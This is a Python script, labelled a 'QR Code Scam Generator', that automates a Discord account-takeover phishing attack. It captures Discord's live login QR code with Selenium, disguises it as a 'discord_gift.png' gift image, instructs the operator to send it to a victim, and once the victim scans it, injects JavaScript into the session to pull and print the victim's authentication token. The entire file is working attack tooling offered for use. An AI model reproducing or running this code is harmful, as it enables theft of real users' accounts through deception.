from bs4 import BeautifulSoup
from selenium import webdriver
from PIL import Image
import base64
import time
import os

def logo_qr():
    im1 = Image.open('temp/qr_code.png', 'r')
    im2 = Image.open('temp/overlay.png', 'r')
    im2_w, im2_h = im2.size
    im1.paste(im2, (60, 55))
    im1.save('temp/final_qr.png', quality=95)

def paste_template():
    im1 = Image.open('temp/template.png', 'r')
    im2 = Image.open('temp/final_qr.png', 'r')
    im1.paste(im2, (120, 409))
    im1.save('discord_gift.png', quality=95)

def main():
    print('Made By: Kush-0009\n GitHub: https://github.com/Kush-009/\n')
    print('** QR Code Scam Generator **')

    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_experimental_option('detach', True)
    
    driver = webdriver.Chrome(options=options)

    driver.get('https://discord.com/login')
    
    print('- Waiting for page and QR code to load...')
    
    file = os.path.join(os.getcwd(), 'temp/qr_code.png')
    
    qr_code_found = False
    attempts = 0
    while not qr_code_found and attempts < 15:
        time.sleep(1)
        attempts += 1
        
        
        try:
            graphic_element = driver.find_element('xpath', "//*[contains(@class, 'qrCode')]//*[name()='svg' or name()='canvas' or name()='img']")
            graphic_element.screenshot(file)
            
            if os.path.exists(file) and os.path.getsize(file) > 0:
                qr_code_found = True
                break
        except Exception:
            pass

        # METHOD 2: Original Base64 Decode (Kept as fallback so no features are removed)
        if not qr_code_found:
            try:
                page_source = driver.page_source
                soup = BeautifulSoup(page_source, features='lxml')
                img_tag = soup.find('img', src=lambda s: s and 'base64' in s)
                if img_tag is not None:
                    qr_code_base64 = img_tag['src']
                    if ',' in qr_code_base64:
                        b64_str = qr_code_base64.split(',')[1].strip()
                    else:
                        b64_str = qr_code_base64.strip()
                    b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
                    img_data = base64.b64decode(b64_str)
                    with open(file,'wb') as handler:
                        handler.write(img_data)
                    qr_code_found = True
                    break
            except Exception:
                pass


    if not qr_code_found:
        print("ERROR: Could not find the QR Code after 15 seconds.")
        print("Look at the Chrome window! Discord might be blocking the browser with a Captcha, or the layout changed.")
        return

    print('- Page loaded.')

    discord_login = driver.current_url
    logo_qr()
    paste_template()

    print('- QR Code has been generated. > discord_gift.png')
    print('Send the QR Code to user and scan. Waiting..')
    
    while True:
        if discord_login != driver.current_url:
            print('Grabbing token..')
            
            token = driver.execute_script('''
                window.dispatchEvent(new Event('beforeunload'));
                let token = null;
                window.webpackChunkdiscord_app.push([
                    [Math.random()],
                    {},
                    (req) => {
                        for (const m of Object.keys(req.c).map((x) => req.c[x].exports)) {
                            if (m && m.default && m.default.getToken !== undefined) {
                                let t = m.default.getToken();
                                if (typeof t === 'string' && t.length > 20) {
                                    token = t;
                                }
                            }
                            if (m && m.getToken !== undefined) {
                                let t = m.getToken();
                                if (typeof t === 'string' && t.length > 20) {
                                    token = t;
                                }
                            }
                        }
                    },
                ]);
                return token;
            ''')
            
            print('---')
            print('Token grabbed:', token)
            break

    print('Task complete.')

if __name__ == '__main__':
    main()
